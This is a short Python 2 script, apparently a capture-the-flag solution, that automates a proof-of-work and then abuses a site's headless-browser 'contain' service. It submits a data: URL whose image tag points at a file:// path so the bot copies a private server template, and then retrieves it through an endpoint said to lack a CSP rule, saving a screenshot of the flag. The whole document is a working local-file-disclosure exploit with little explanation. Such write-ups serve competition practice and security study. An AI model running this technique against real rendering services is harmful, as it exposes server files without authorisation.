#!/usr/bin/env python2
import os
import time
import base64
import binascii
import requests
import subprocess
from hashlib import sha256

def solve_pow(url, ses=None, refresh='/pow/refresh'):
    if ses is None:
        ses = requests.session()
    r = ses.get(url.strip('/')+refresh)
    count = r.json()['count']
    goal = r.json()['pow']
    n = len(goal)

    val = binascii.hexlify(os.urandom(16))
    found = []
    while len(found) < count:
        h = sha256(val).hexdigest()
        if h[:n] == goal:
            found.append(val.decode('latin-1'))
            print('%u/%u'%(len(found), count))
        val = h.encode('latin-1')

    sol = dict(_pow_solution=';'.join(found))
    return sol, ses

BASEURL = 'https://scp-terminal.foundation'

ses = requests.session()

def do_req(url):
    data,_ = solve_pow(BASEURL, ses)
    data.update(dict(
        url=url
    ))
        
    r = ses.post(BASEURL+'/contain', data=data)
    uid = r.json()['uid']
    while 1:
        time.sleep(5)
        r = ses.get(BASEURL+'/status')
        j = r.json()
        if j['status'] in ['done','ready']:
            sct = j.get('screenshot', None)
            scp = j.get('scp', None)
            return uid, sct, scp

def download(url):
    # Or just host this as a file somewhere that the box can reach
    download_url = 'data:text/html,<div class="scp-image-block"><img src="'+url+'"></div>scp-wiki'
    uid, sct, scp = do_req(download_url)
    return scp

path = '/server'

# Download the flag to the site_19 dir
l = download('file://'+path+'/templates/scp-31337.html')[2:]
print('File saved to',l[:])

# Request the flag from the scp endpoint
# (does not have the inline-styles csp rule)
u = BASEURL+'/'+l
print('Requesting',u)
_, sct,_ = do_req(BASEURL+'/'+l+'?scp-')
r = ses.get(BASEURL + sct)
with open('/tmp/flag.png','wb') as f:
    f.write(r.content)
